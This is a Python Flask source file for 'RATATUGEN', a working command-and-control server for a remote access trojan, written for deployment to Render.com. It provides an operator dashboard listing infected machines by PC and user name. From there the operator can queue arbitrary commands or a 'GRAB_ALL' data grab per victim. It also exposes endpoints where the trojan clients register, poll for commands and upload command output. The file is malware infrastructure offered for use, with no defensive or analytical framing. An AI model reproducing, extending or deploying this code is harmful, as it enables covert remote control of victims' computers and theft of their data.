"""
RATATUGEN Web C2 Server — deploy to Render.com as a Web Service
"""
from flask import Flask, request, render_template_string, redirect, session
import time, json, html

app = Flask(__name__)
app.secret_key = "ratatugen_c2_secret_2026"

ADMIN_PASSWORD = "ratatugen2026"  # change this

# In-memory state (resets on deploy; for persistence, use SQLite or Redis)
clients = {}     # client_id -> {"last_seen": timestamp, "user": "", "pc": ""}
commands = {}    # client_id -> command
results = {}     # client_id -> [(time, command, output), ...]

LOGIN_PAGE = '''
<!DOCTYPE html><html><head><title>RATATUGEN C2</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0d0d0d;color:#ccc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}
  form{background:#1a1a1a;padding:30px;border-radius:8px;border:1px solid #333}
  input{width:100%;padding:10px;margin:8px 0;background:#000;border:1px solid #333;color:#fff;border-radius:4px}
  button{width:100%;padding:10px;background:#c00;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
  h2{color:#c00;text-align:center;margin-bottom:20px}
</style></head><body>
<form method="POST">
  <h2>RATATUGEN C2</h2>
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form></body></html>'''

DASHBOARD = '''
<!DOCTYPE html><html><head><title>RATATUGEN — {{ clients|length }} Clients</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0a0a0a;color:#ddd;font-family:monospace;padding:20px}
  h1{color:#c00;margin-bottom:10px}
  .bar{display:flex;gap:10px;margin:15px 0;flex-wrap:wrap}
  .bar form{display:flex;gap:10px;flex:1}
  input,select{background:#111;border:1px solid #333;color:#fff;padding:8px 12px;border-radius:4px;font-family:monospace}
  button{background:#c00;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:bold}
  table{width:100%;border-collapse:collapse;margin-top:15px}
  th{background:#1a1a1a;padding:10px;text-align:left;border-bottom:2px solid #c00;font-size:13px}
  td{padding:10px;border-bottom:1px solid #222;font-size:12px}
  .online{color:#0f0}.offline{color:#c00}
  pre{background:#111;padding:10px;border-radius:4px;margin:8px 0;max-height:300px;overflow-y:auto;font-size:11px;border:1px solid #333}
  .cmd-bar{z-index:10}
  .refresh{float:right;background:#333}
</style>
<script>
  function sendCmd(cid) { var cmd = document.getElementById('cmd_'+cid).value; if(cmd) window.location='/send?client='+cid+'&cmd='+encodeURIComponent(cmd); }
</script></head><body>
<h1>RATATUGEN C2</h1>
<a href="/" class="refresh"><button class="refresh">Refresh</button></a>
<div class="bar">
  <form method="GET" action="/send">
    <select name="client">{% for c in clients %}<option value="{{c}}">{{c}}</option>{% endfor %}</select>
    <input name="cmd" placeholder="Command..." style="flex:1">
    <button>Send</button>
  </form>
  <form method="GET" action="/grab">
    <select name="client">{% for c in clients %}<option value="{{c}}">{{c}}</option>{% endfor %}</select>
    <button>Grab</button>
  </form>
</div>
<table>
  <tr><th>Client</th><th>PC / User</th><th>Last Seen</th><th>Status</th><th></th></tr>
  {% for cid, info in clients.items() %}
  <tr>
    <td><b>{{cid}}</b></td>
    <td>{{info.get("pc","?")}} / {{info.get("user","?")}}</td>
    <td>{{info.get("last","-")}}</td>
    <td class="{{'online' if info.get('online') else 'offline'}}">{{'ONLINE' if info.get('online') else 'OFF'}}</td>
    <td><button onclick="location='/grab?client={{cid}}'">Grab</button></td>
  </tr>
  {% endfor %}
</table>
<hr style="border-color:#333;margin:20px 0">
<h3>Recent Results</h3>
{% for cid, res_list in results.items() %}
  <h4>{{cid}}</h4>
  {% for t, cmd, out in res_list[-5:]|reverse %}
    <pre><b>{{t}}</b> $ {{cmd}}
{{out}}</pre>
  {% endfor %}
{% endfor %}
</body></html>'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['authed'] = True
            return redirect('/')
        return LOGIN_PAGE.replace('RATATUGEN C2', 'RATATUGEN C2 — Wrong Password')
    if session.get('authed'):
        return dashboard()
    return LOGIN_PAGE

def dashboard():
    now = time.time()
    for cid in list(clients.keys()):
        clients[cid]['online'] = (now - clients[cid].get('_last', 0)) < 30
        clients[cid]['last'] = time.ctime(clients[cid].get('_last', 0))
    return render_template_string(DASHBOARD, clients=clients, results=results)

@app.route('/send')
def send_cmd():
    if not session.get('authed'): return redirect('/')
    cid = request.args.get('client', '')
    cmd = request.args.get('cmd', '')
    if cid and cmd:
        commands[cid] = cmd
    return redirect('/')

@app.route('/grab')
def grab():
    if not session.get('authed'): return redirect('/')
    cid = request.args.get('client', '')
    if cid:
        commands[cid] = "GRAB_ALL"
    return redirect('/')

# === REST API (RAT clients) ===

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json(silent=True) or {}
    cid = data.get('id', 'unknown')
    clients[cid] = {
        'pc': data.get('pc', '?'),
        'user': data.get('user', '?'),
        '_last': time.time(),
        'last': time.ctime(),
        'online': True
    }
    return {"status": "ok"}

@app.route('/poll', methods=['POST'])
def poll():
    data = request.get_json(silent=True) or {}
    cid = data.get('id', 'unknown')
    # Update heartbeat
    if cid in clients:
        clients[cid]['_last'] = time.time()
        clients[cid]['online'] = True
    else:
        clients[cid] = {'pc': cid, 'user': '?', '_last': time.time(), 'online': True}
    
    cmd = commands.pop(cid, None) or commands.pop("*", None)
    return {"command": cmd or ""}

@app.route('/result', methods=['POST'])
def result():
    data = request.get_json(silent=True) or {}
    cid = data.get('id', 'unknown')
    cmd = data.get('command', '')
    out = data.get('output', '')
    if cid not in results:
        results[cid] = []
    results[cid].append((time.ctime(), cmd, out))
    # Keep only last 20 results per client
    if len(results[cid]) > 20:
        results[cid] = results[cid][-20:]
    return {"status": "ok"}

if __name__ == '__main__':
    print("[RATATUGEN C2] Starting web server on port 5000...")
    app.run(host='0.0.0.0', port=5000)